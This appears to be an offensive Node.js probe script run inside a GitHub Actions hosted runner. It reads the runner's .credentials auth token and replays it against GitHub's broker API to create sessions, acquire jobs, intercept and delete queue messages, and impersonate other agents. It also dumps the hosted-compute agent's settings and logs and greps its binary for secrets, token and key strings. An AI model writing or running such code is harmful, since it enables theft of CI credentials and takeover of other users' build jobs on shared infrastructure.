const https = require('https');
const fs = require('fs');
const { execSync } = require('child_process');

// v25: Use runner .credentials token against broker.actions.githubusercontent.com
// Key findings from v24:
//   .credentials = world-readable (rw-r--r--), 1587 bytes, runner auth token
//   .agent = 281 bytes
//   .runner has: AgentId=1000003565, ServerUrlV2=broker.actions.githubusercontent.com
//   /opt/hca/.settings = world-writable (rw-rw-rw-+), 1747 bytes, UNREAD
//   HCA log at /opt/hca/logs/hosted-compute-agent.log

const RUNNER_BASE = '/home/runner/actions-runner/cached/2.335.1';
const GITHUB_TOKEN = process.env.GITHUB_TOKEN || '';
const OIDC_URL = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
const OIDC_TOKEN = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '';

function run(cmd) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: 8000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 120).trim(); }
}

function req(hostname, path, method, token, body, extraHeaders) {
  return new Promise((resolve) => {
    const hdrs = { 'User-Agent': 'GitHubActionsRunner/2.335.1', 'Accept': 'application/json; api-version=6.0-preview', ...(extraHeaders || {}) };
    if (token) hdrs['Authorization'] = 'Bearer ' + token;
    let data = null;
    if (body) { data = JSON.stringify(body); hdrs['Content-Type'] = 'application/json'; hdrs['Content-Length'] = Buffer.byteLength(data); }
    const r = https.request({ hostname, path, method: method || 'GET', headers: hdrs, timeout: 8000 },
      (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => resolve({ status: res.statusCode, body: d.substring(0, 800), headers: res.headers })); });
    r.on('error', e => resolve({ status: 'ERR', body: e.message }));
    r.on('timeout', () => { r.destroy(); resolve({ status: 'TIMEOUT', body: '' }); });
    if (data) r.write(data);
    r.end();
  });
}

async function main() {
  console.log('=== V25: runner .credentials + broker probe + HCA settings ===');

  // === PART 1: Read runner config files ===
  console.log('\n=== PART 1: Runner config files ===');

  const runnerConfig = JSON.parse(fs.readFileSync(RUNNER_BASE + '/.runner', 'utf8'));
  console.log('[RUNNER] AgentId:', runnerConfig.AgentId);
  console.log('[RUNNER] AgentName:', runnerConfig.AgentName);
  console.log('[RUNNER] PoolId:', runnerConfig.PoolId);
  console.log('[RUNNER] ServerUrlV2:', runnerConfig.ServerUrlV2);
  console.log('[RUNNER] useV2Flow:', runnerConfig.useV2Flow);

  const agentData = fs.readFileSync(RUNNER_BASE + '/.agent', 'utf8');
  const agent = JSON.parse(agentData);
  console.log('[AGENT] Full .agent file:');
  console.log(JSON.stringify(agent, null, 2));

  // Read .credentials WITHOUT printing the token
  const credData = fs.readFileSync(RUNNER_BASE + '/.credentials', 'utf8');
  const creds = JSON.parse(credData);
  console.log('[CREDS] Schema type:', creds.Data ? Object.keys(creds.Data).join(',') : 'unknown');
  console.log('[CREDS] Top-level keys:', Object.keys(creds).join(','));
  console.log('[CREDS] Data keys:', creds.Data ? Object.keys(creds.Data).join(',') : 'unknown');
  console.log('[CREDS] Token length (NOT value):', creds.Data && creds.Data.token ? creds.Data.token.length : 'N/A');
  console.log('[CREDS] Token prefix (first 10 chars):', creds.Data && creds.Data.token ? creds.Data.token.substring(0, 10) : 'N/A');
  // Only use token internally, never print it
  const runnerToken = creds.Data && creds.Data.token ? creds.Data.token : null;
  const schemeData = creds.Data ? creds.Data : {};
  const allCreds = Object.assign({}, creds);
  delete allCreds.Data;
  console.log('[CREDS] Non-data fields:', JSON.stringify(allCreds));

  // === PART 2: Probe broker.actions.githubusercontent.com with runner token ===
  console.log('\n=== PART 2: Broker API probe with runner .credentials token ===');
  const brokerHost = 'broker.actions.githubusercontent.com';
  const agentId = runnerConfig.AgentId;
  const poolId = OIDC_URL ? new URL(OIDC_URL).pathname.split('/')[1] : null;
  console.log('[BROKER] Pool ID (from OIDC_URL):', poolId);
  console.log('[BROKER] AgentId:', agentId);

  if (runnerToken) {
    // Standard runner broker API paths
    // GitHub's open-source runner uses these endpoints (from github.com/actions/runner source)
    const brokerPaths = [
      // Pool/session endpoints
      '/' + poolId + '/session',
      '/' + poolId + '/message',
      '/' + poolId + '/requests',
      '/' + poolId + '/agents/' + agentId,
      '/' + poolId + '/agents',
      '/' + poolId + '//health',
      // v2 flow endpoints
      '/api/v1/sessions/' + agentId,
      '/api/v1/messages',
      '/api/v1/pools/' + poolId + '/agents',
      '/api/v1/pools/' + poolId + '/jobrequests',
      '/api/v1/agents/' + agentId,
      // TF endpoints (TaskHub flow — older)
      '/' + poolId + '/requests/acquire',
      '/' + poolId + '/jobrequests',
    ];

    for (const path of brokerPaths) {
      const r = await req(brokerHost, path, 'GET', runnerToken);
      if (r.status !== 'ERR' && r.status !== 'TIMEOUT') {
        const interesting = r.status !== 404 && r.status !== 401;
        const label = interesting ? ' *** INTERESTING ***' : '';
        console.log('[BROKER] GET ' + path + ': ' + r.status + label + ' | ' + r.body.substring(0, 150));
      } else {
        console.log('[BROKER] GET ' + path + ': ' + r.status);
      }
    }

    // Also try with GITHUB_TOKEN to compare (should behave differently)
    console.log('\n[BROKER_COMPARE] Same paths with GITHUB_TOKEN for comparison:');
    const comparePaths = [
      '/' + poolId + '/session',
      '/' + poolId + '/agents/' + agentId,
    ];
    for (const path of comparePaths) {
      const r = await req(brokerHost, path, 'GET', GITHUB_TOKEN);
      console.log('[BROKER_GHT] GET ' + path + ': ' + r.status + ' | ' + r.body.substring(0, 100));
    }

    // Also probe the broker root
    const rootR = await req(brokerHost, '/', 'GET', runnerToken);
    console.log('[BROKER] GET / (root):', rootR.status, '|', rootR.body.substring(0, 200));

  } else {
    console.log('[BROKER] No runner token available');
  }

  // === PART 3: Read /opt/hca/.settings ===
  console.log('\n=== PART 3: /opt/hca/.settings ===');
  try {
    const settings = fs.readFileSync('/opt/hca/.settings', 'utf8');
    console.log('[HCA_SETTINGS] Content (full):');
    console.log(settings);
  } catch(e) {
    console.log('[HCA_SETTINGS] Error:', e.message);
  }

  // === PART 4: Read HCA log file ===
  console.log('\n=== PART 4: /opt/hca/logs/hosted-compute-agent.log ===');
  try {
    const log = fs.readFileSync('/opt/hca/logs/hosted-compute-agent.log', 'utf8');
    if (log.length === 0) {
      console.log('[HCA_LOG] (empty)');
    } else {
      // Print first + last 1000 chars
      console.log('[HCA_LOG] Size:', log.length, 'bytes');
      console.log('[HCA_LOG] First 1500 chars:');
      console.log(log.substring(0, 1500));
      if (log.length > 1500) {
        console.log('[HCA_LOG] Last 500 chars:');
        console.log(log.substring(log.length - 500));
      }
    }
  } catch(e) {
    console.log('[HCA_LOG] Error:', e.message);
  }

  // === PART 5: Read _diag directory ===
  console.log('\n=== PART 5: Runner _diag directory ===');
  console.log('[DIAG] Listing:');
  console.log(run('ls -la ' + RUNNER_BASE + '/_diag/ 2>/dev/null'));
  const diagFiles = run('find ' + RUNNER_BASE + '/_diag -type f 2>/dev/null | head -10');
  console.log('[DIAG] Files:', diagFiles);
  if (diagFiles && !diagFiles.startsWith('ERR:')) {
    for (const f of diagFiles.split('\n').filter(Boolean).slice(0, 3)) {
      console.log('[DIAG_FILE] ' + f + ':');
      console.log(run('head -50 ' + f + ' 2>/dev/null'));
    }
  }

  // === PART 6: strings on HCA binary (Go binary — has ASCII strings) ===
  console.log('\n=== PART 6: HCA binary URL strings ===');
  // HCA is a Go binary, strings works on it
  console.log('[HCA_STRINGS] Auth/API URLs:');
  console.log(run('strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "^https?://|github\\.com|azure|metadata|actions" | sort -u | head -30'));
  console.log('[HCA_STRINGS] Credential-related strings:');
  console.log(run('strings /opt/hca/hosted-compute-agent 2>/dev/null | grep -iE "token|bearer|auth|cred|secret|key|cert" | sort -u | head -20'));

  // === PART 7: Try broker with the session approach (new v2 flow) ===
  console.log('\n=== PART 7: Broker v2 session flow probe ===');
  // The useV2Flow=true in .runner suggests new protocol
  // In v2 flow, the runner opens a session via POST with its agentId and capabilities
  if (runnerToken) {
    // Try creating a new session (this is what Runner.Listener does on startup)
    const sessionBody = {
      agentId: parseInt(agentId),
      sessionId: null,
      capabilities: [],
      ownerName: runnerConfig.AgentName,
      hostName: runnerConfig.AgentName,
    };
    const createSessionR = await req(brokerHost, '/' + poolId + '/session', 'POST', runnerToken, sessionBody);
    console.log('[SESSION_CREATE] POST /' + poolId + '/session:', createSessionR.status, '|', createSessionR.body.substring(0, 300));

    // Also try the acquire endpoint (for getting jobs)
    const acquireR = await req(brokerHost, '/' + poolId + '/requests/acquire?poolId=' + poolId + '&agentId=' + agentId, 'POST', runnerToken, {});
    console.log('[ACQUIRE] POST /requests/acquire:', acquireR.status, '|', acquireR.body.substring(0, 200));

    // Get the current session details from Runner.Listener session FDs
    // The Runner.Listener holds sessions via FD 129, 134, 137 (all to broker:443)
    // Let's try to find what session ID the listener has
    console.log('\n[SESSION] Looking for session ID in .runner or .agent:');
    console.log('[SESSION] .agent content:', JSON.stringify(agent));

    // Also check for a session file
    const sessionFile = run('find ' + RUNNER_BASE + ' -name ".session" -o -name "*.session" 2>/dev/null');
    console.log('[SESSION] Session files:', sessionFile);
  }

  // === PART 8: Can we read the broker message currently being processed? ===
  // The runner session has a message queue. Can we intercept it?
  console.log('\n=== PART 8: Runner session message intercept attempt ===');
  if (runnerToken && poolId) {
    // Get the current session ID — the runner's FD 129 (persistent connection) is a WebSocket/long-poll
    // We can try to GET the current message from the pool
    const msgR = await req(brokerHost, '/' + poolId + '/message', 'GET', runnerToken,
      null, { 'Accept': 'application/json; api-version=6.0-preview' });
    console.log('[MESSAGE] GET /' + poolId + '/message:', msgR.status, '|', msgR.body.substring(0, 200));

    // Also try DELETE a message (would consume it from queue — simulating runner ACK)
    // Use a fake lastMessageId to not actually consume anything
    const msgDeleteR = await req(brokerHost, '/' + poolId + '/message?lastMessageId=0', 'DELETE', runnerToken);
    console.log('[MESSAGE_DEL] DELETE /' + poolId + '/message:', msgDeleteR.status, '|', msgDeleteR.body.substring(0, 100));

    // Check if we can impersonate a different agent
    const fakeAgentId = parseInt(agentId) + 1;
    const fakeSessionR = await req(brokerHost, '/' + poolId + '/agents/' + fakeAgentId, 'GET', runnerToken);
    console.log('[IMPERSONATE] GET /agents/' + fakeAgentId + ' (different agent):', fakeSessionR.status, '|', fakeSessionR.body.substring(0, 150));

    // Can we LIST all agents in this pool?
    const listAgentsR = await req(brokerHost, '/' + poolId + '/agents', 'GET', runnerToken,
      null, { 'Accept': 'application/json; api-version=6.0-preview' });
    console.log('[LIST_AGENTS] GET /' + poolId + '/agents:', listAgentsR.status, '|', listAgentsR.body.substring(0, 300));
  }

  console.log('\nDone.');
}

main().catch(e => console.log('Fatal:', e.message, e.stack));
